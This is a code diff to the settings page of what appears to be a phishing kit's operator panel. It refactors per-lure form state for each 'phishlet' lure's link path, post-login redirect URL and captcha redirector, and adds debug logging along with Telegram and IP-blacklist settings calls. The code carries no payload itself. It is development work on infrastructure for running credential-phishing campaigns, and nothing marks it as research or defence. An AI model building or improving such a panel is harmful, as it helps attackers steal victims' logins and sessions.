@@ -20,6 +20,13 @@ interface Lure {
   ua_filter: string;
 }
 
+// Added this interface to track form state for each lure independently
+interface LureFormState {
+  redirectUrl: string;
+  useCaptcha: boolean;
+  linkPath: string;
+}
+
 interface LuresResponse {
   lures: Lure[];
 }
@@ -52,6 +59,10 @@ export default function Settings() {
   const [error, setError] = useState<string | null>(null);
   const [lures, setLures] = useState<Lure[]>([]);
   const [selectedLure, setSelectedLure] = useState<Lure | null>(null);
+  // New state to track form data for each lure independently
+  const [lureFormStates, setLureFormStates] = useState<
+    Record<string, LureFormState>
+  >({});
 
   // Define the fetcher function for SWR
   const fetcher = (url: string) => fetch(url).then((res) => res.json());
@@ -106,8 +117,11 @@ export default function Settings() {
     const fetchSettings = async () => {
       try {
         setLoading(true);
+        console.log("Fetching all settings...");
+
         // Get saved lure ID from localStorage if it exists
         const savedLureId = localStorage.getItem("selectedLureId");
+        console.log("Saved lure ID from localStorage:", savedLureId);
 
         const [
           telegramResponse,
@@ -139,18 +153,27 @@ export default function Settings() {
         const blacklistData = await blacklistResponse.json();
         const luresData = await luresResponse.json();
 
-        setLures(luresData.lures || []);
+        console.log("Fetched lures:", luresData.lures?.length || 0);
+
+        // Get the lures data
+        const fetchedLures = luresData.lures || [];
+        setLures(fetchedLures);
+
+        // Prepare form states for all lures
+        const newFormStates: Record<string, LureFormState> = {};
 
         // If there are lures available
-        if (luresData.lures && luresData.lures.length > 0) {
+        if (fetchedLures.length > 0) {
+          console.log("Processing fetched lures...");
           let lureToSelect: Lure | null = null;
 
           // First try to use the saved lure ID from localStorage
           if (savedLureId) {
-            const savedLure = luresData.lures.find(
+            const savedLure = fetchedLures.find(
               (lure) => lure.id === savedLureId
             );
             if (savedLure) {
+              console.log("Found saved lure:", savedLure.phishlet);
               lureToSelect = savedLure;
 
               // Fetch the specific lure's full configuration
@@ -160,23 +183,28 @@ export default function Settings() {
                 );
                 if (lureConfigResponse.ok) {
                   const lureConfig = await lureConfigResponse.json();
+                  console.log("Fetched lure config:", lureConfig);
 
-                  // Update link data with the lure-specific configuration
+                  // Set up form state for this lure
                   if (lureToSelect) {
-                    linkData.afterLoginRedirect =
-                      lureToSelect.redirect_url || linkData.afterLoginRedirect;
-                    linkData.useCaptcha = lureToSelect.redirector === "main";
-
-                    // If we have a path in lureConfig, use it
-                    if (lureConfig.path) {
-                      linkData.linkPath = lureConfig.path;
-                    } else {
-                      // Otherwise use the path from the lure
-                      const cleanPath = lureToSelect.path.startsWith("/")
+                    const cleanPath =
+                      lureConfig.path ||
+                      (lureToSelect.path.startsWith("/")
                         ? lureToSelect.path.substring(1)
-                        : lureToSelect.path;
-                      linkData.linkPath = cleanPath;
-                    }
+                        : lureToSelect.path);
+
+                    newFormStates[savedLure.id] = {
+                      linkPath: cleanPath,
+                      redirectUrl:
+                        lureToSelect.redirect_url ||
+                        linkData.afterLoginRedirect,
+                      useCaptcha: lureToSelect.redirector === "main",
+                    };
+
+                    console.log(
+                      `Created form state for saved lure ${savedLure.id}:`,
+                      newFormStates[savedLure.id]
+                    );
                   }
                 }
               } catch (error) {
@@ -187,22 +215,48 @@ export default function Settings() {
 
           // If no saved lure found, try to match with current link path
           if (!lureToSelect) {
-            const currentLure = luresData.lures.find(
+            const currentLure = fetchedLures.find(
               (lure) =>
                 lure.path === `/${linkData.linkPath}` ||
                 lure.path === linkData.linkPath
             );
 
             if (currentLure) {
+              console.log("Found matching lure by path:", currentLure.phishlet);
               lureToSelect = currentLure;
             }
           }
 
           // Set the selected lure
           if (lureToSelect) {
+            console.log("Setting selected lure:", lureToSelect.phishlet);
             setSelectedLure(lureToSelect);
           }
+
+          // Create form states for all lures
+          fetchedLures.forEach((lure) => {
+            // Skip if we already set up this lure's form state above
+            if (newFormStates[lure.id]) return;
+
+            const cleanPath = lure.path.startsWith("/")
+              ? lure.path.substring(1)
+              : lure.path;
+
+            newFormStates[lure.id] = {
+              linkPath: cleanPath,
+              redirectUrl: lure.redirect_url || linkData.afterLoginRedirect,
+              useCaptcha: lure.redirector === "main",
+            };
+
+            console.log(
+              `Created form state for lure ${lure.id} (${lure.phishlet}):`,
+              newFormStates[lure.id]
+            );
+          });
         }
+
+        // Update all form states
+        setLureFormStates(newFormStates);
 
         // Set the settings with the data we have
         setSettings((prev) => ({
@@ -216,6 +270,8 @@ export default function Settings() {
           linkPath: linkData.linkPath || "",
           blacklistedIPs: blacklistData.ips || [],
         }));
+
+        console.log("Settings fetch and initialization complete");
       } catch (error) {
         console.error("Error loading settings:", error);
         toast.error("Failed to load settings");
@@ -225,6 +281,51 @@ export default function Settings() {
     };
     fetchSettings();
   }, []);
+
+  // Initialize form state for each lure
+  useEffect(() => {
+    if (lures.length > 0) {
+      console.log("Initializing form states for lures:", lures.length);
+
+      const initialFormStates: Record<string, LureFormState> = {};
+
+      lures.forEach((lure) => {
+        const cleanPath = lure.path.startsWith("/")
+          ? lure.path.substring(1)
+          : lure.path;
+
+        initialFormStates[lure.id] = {
+          redirectUrl: lure.redirect_url || settings.afterLoginRedirect,
+          useCaptcha: lure.redirector === "main",
+          linkPath: cleanPath,
+        };
+
+        console.log(
+          `Initialized form state for lure ${lure.id} (${lure.phishlet}):`,
+          initialFormStates[lure.id]
+        );
+      });
+
+      setLureFormStates((prev) => {
+        // Maintain existing form states for lures that haven't changed
+        const updated = { ...prev };
+
+        // Add/update form states for new or changed lures
+        Object.entries(initialFormStates).forEach(([lureId, formState]) => {
+          // Only update if this lure doesn't have a form state yet, or if key fields have changed
+          if (
+            !prev[lureId] ||
+            prev[lureId].linkPath !== formState.linkPath ||
+            prev[lureId].redirectUrl !== formState.redirectUrl
+          ) {
+            updated[lureId] = formState;
+          }
+        });
+
+        return updated;
+      });
+    }
+  }, [lures, settings.afterLoginRedirect]);
 
   // Enhance the lureChanged event listener to update all form fields completely
   useEffect(() => {
@@ -248,21 +349,21 @@ export default function Settings() {
           if (lureConfigResponse.ok) {
             const lureConfig = await lureConfigResponse.json();
 
-            // Update all settings related to this lure
-            setSettings((prev) => {
-              // Determine the clean path
-              const cleanPath = selected.path.startsWith("/")
-                ? selected.path.substring(1)
-                : selected.path;
+            // Determine the clean path
+            const cleanPath = selected.path.startsWith("/")
+              ? selected.path.substring(1)
+              : selected.path;
 
-              return {
-                ...prev,
+            // Update the form state for this specific lure
+            setLureFormStates((prev) => ({
+              ...prev,
+              [lureId]: {
                 linkPath: lureConfig.path || cleanPath,
-                afterLoginRedirect:
-                  selected.redirect_url || prev.afterLoginRedirect,
+                redirectUrl:
+                  selected.redirect_url || settings.afterLoginRedirect,
                 useCaptcha: selected.redirector === "main",
-              };
-            });
+              },
+            }));
 
             // Display a notification that settings form has been updated
             toast.success(
@@ -277,12 +378,14 @@ export default function Settings() {
             ? selected.path.substring(1)
             : selected.path;
 
-          setSettings((prev) => ({
+          // Update with basic information even if the API call fails
+          setLureFormStates((prev) => ({
             ...prev,
-            linkPath: cleanPath,
-            afterLoginRedirect:
-              selected.redirect_url || prev.afterLoginRedirect,
-            useCaptcha: selected.redirector === "main",
+            [lureId]: {
+              linkPath: cleanPath,
+              redirectUrl: selected.redirect_url || settings.afterLoginRedirect,
+              useCaptcha: selected.redirector === "main",
+            },
           }));
 
           toast.error("Partially updated form with available lure settings");
@@ -303,7 +406,7 @@ export default function Settings() {
         handleLureChangedEvent as EventListener
       );
     };
-  }, [lures]);
+  }, [lures, settings.afterLoginRedirect]);
 
   const handleTelegramSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -340,12 +443,39 @@ export default function Settings() {
     }
   };
 
-  const handleCombinedLureSubmit = async (e: React.FormEvent) => {
+  // Handle form field changes for a specific lure
+  const handleLureFormChange = (
+    lureId: string,
+    field: keyof LureFormState,
+    value: string | boolean
+  ) => {
+    console.log(`Updating lure ${lureId} field ${field} to:`, value);
+
+    setLureFormStates((prev) => ({
+      ...prev,
+      [lureId]: {
+        ...prev[lureId],
+        [field]: value,
+      },
+    }));
+  };
+
+  // Modified submit handler for individual lure forms
+  const handleLureFormSubmit = async (e: React.FormEvent, lure: Lure) => {
     e.preventDefault();
-    if (!selectedLure) return;
+    console.log(`Submitting form for lure ${lure.id} (${lure.phishlet})`);
 
     try {
       setSaving(true);
+
+      // Get the form state for this specific lure
+      const formState = lureFormStates[lure.id];
+      if (!formState) {
+        console.error(`No form state found for lure ${lure.id}`);
+        return;
+      }
+
+      console.log(`Form state for lure ${lure.id}:`, formState);
 
       // Security settings request
       const securityRequestBody = {
@@ -354,7 +484,6 @@ export default function Settings() {
         redirectGuard: settings.redirectGuard,
       };
 
-      // If we have a selected lure, include its ID
       const securityResponse = await fetch("/api/security-settings", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -365,12 +494,12 @@ export default function Settings() {
         throw new Error("Failed to update security settings");
       }
 
-      // Link settings request
+      // Link settings request with this specific lure's data
       const linkRequestBody = {
-        afterLoginRedirect: settings.afterLoginRedirect,
-        useCaptcha: settings.useCaptcha,
-        linkPath: settings.linkPath,
-        lureId: selectedLure.id,
+        afterLoginRedirect: formState.redirectUrl,
+        useCaptcha: formState.useCaptcha,
+        linkPath: formState.linkPath,
+        lureId: lure.id,
       };
 
       const linkResponse = await fetch("/api/link-settings", {
@@ -389,12 +518,25 @@ export default function Settings() {
       });
 
       // Update the localStorage with the selected lure ID
-      localStorage.setItem("selectedLureId", selectedLure.id);
+      localStorage.setItem("selectedLureId", lure.id);
+
+      // Update the lures array with the new data
+      setLures((prevLures) =>
+        prevLures.map((l) =>
+          l.id === lure.id
+            ? {
+                ...l,
+                redirect_url: formState.redirectUrl,
+                redirector: formState.useCaptcha ? "main" : "",
+              }
+            : l
+        )
+      );
 
       // Emit custom events
       const securityEvent = new CustomEvent("securitySettingsUpdated", {
         detail: {
-          lureId: selectedLure.id,
+          lureId: lure.id,
           settings: securityRequestBody,
         },
       });
@@ -402,7 +544,7 @@ export default function Settings() {
 
       const linkEvent = new CustomEvent("linkSettingsUpdated", {
         detail: {
-          lureId: selectedLure.id,
+          lureId: lure.id,
           settings: linkRequestBody,
         },
       });
@@ -412,10 +554,10 @@ export default function Settings() {
       setTimeout(() => setShowSuccess(false), 3000);
 
       // Single success toast for both updates
-      toast.success("Lure settings updated successfully");
+      toast.success(`${lure.phishlet} lure settings updated successfully`);
     } catch (error) {
       console.error("Error updating lure settings:", error);
-      toast.error("Failed to update lure settings");
+      toast.error(`Failed to update ${lure.phishlet} lure settings`);
     } finally {
       setSaving(false);
     }
@@ -672,14 +814,10 @@ export default function Settings() {
           lures.map((lure) => (
             <section key={lure.id} className="bg-[#232A34] rounded-lg p-6">
               <h2 className="text-white text-xl mb-4">
-                Link Configuration (Currently editing: {lure.phishlet})
+                Link Configuration: {lure.phishlet} ({lure.path})
               </h2>
               <form
-                onSubmit={(e) => {
-                  // Set the selected lure before submitting
-                  setSelectedLure(lure);
-                  handleCombinedLureSubmit(e);
-                }}
+                onSubmit={(e) => handleLureFormSubmit(e, lure)}
                 className="space-y-6"
               >
                 {/* Link Path - Pre-filled with this lure's path */}
@@ -691,12 +829,10 @@ export default function Settings() {
                     type="text"
                     data-allow-select="true"
                     className="w-full bg-[#1B2028] text-white p-3 rounded"
-                    defaultValue={
-                      lure.path.startsWith("/")
-                        ? lure.path.substring(1)
-                        : lure.path
+                    value={lureFormStates[lure.id]?.linkPath || ""}
+                    onChange={(e) =>
+                      handleLureFormChange(lure.id, "linkPath", e.target.value)
                     }
-                    readOnly
                     placeholder="Enter path (without leading /)"
                   />
                   <p className="text-xs text-gray-500 mt-1">
@@ -714,18 +850,14 @@ export default function Settings() {
                       type="text"
                       data-allow-select="true"
                       className="w-full bg-[#1B2028] text-white p-3 rounded"
-                      defaultValue={
-                        lure.redirect_url || settings.afterLoginRedirect
+                      value={lureFormStates[lure.id]?.redirectUrl || ""}
+                      onChange={(e) =>
+                        handleLureFormChange(
+                          lure.id,
+                          "redirectUrl",
+                          e.target.value
+                        )
                       }
-                      onChange={(e) => {
-                        // Update the redirect URL for this specific lure
-                        const updatedLures = lures.map((l) =>
-                          l.id === lure.id
-                            ? { ...l, redirect_url: e.target.value }
-                            : l
-                        );
-                        setLures(updatedLures);
-                      }}
                       placeholder="https://example.com"
                     />
                   </div>
@@ -791,16 +923,10 @@ export default function Settings() {
                         <input
                           type="radio"
                           data-allow-select="true"
-                          checked={lure.redirector === "main"}
-                          onChange={() => {
-                            // Update the redirector for this specific lure
-                            const updatedLures = lures.map((l) =>
-                              l.id === lure.id
-                                ? { ...l, redirector: "main" }
-                                : l
-                            );
-                            setLures(updatedLures);
-                          }}
+                          checked={lureFormStates[lure.id]?.useCaptcha || false}
+                          onChange={() =>
+                            handleLureFormChange(lure.id, "useCaptcha", true)
+                          }
                           className="text-indigo-500"
                         />
                         <span className="text-gray-400">
@@ -811,14 +937,12 @@ export default function Settings() {
                         <input
                           type="radio"
                           data-allow-select="true"
-                          checked={lure.redirector !== "main"}
-                          onChange={() => {
-                            // Update the redirector for this specific lure
-                            const updatedLures = lures.map((l) =>
-                              l.id === lure.id ? { ...l, redirector: "" } : l
-                            );
-                            setLures(updatedLures);
-                          }}
+                          checked={
+                            !(lureFormStates[lure.id]?.useCaptcha || false)
+                          }
+                          onChange={() =>
+                            handleLureFormChange(lure.id, "useCaptcha", false)
+                          }
                           className="text-indigo-500"
                         />
                         <span className="text-gray-400">
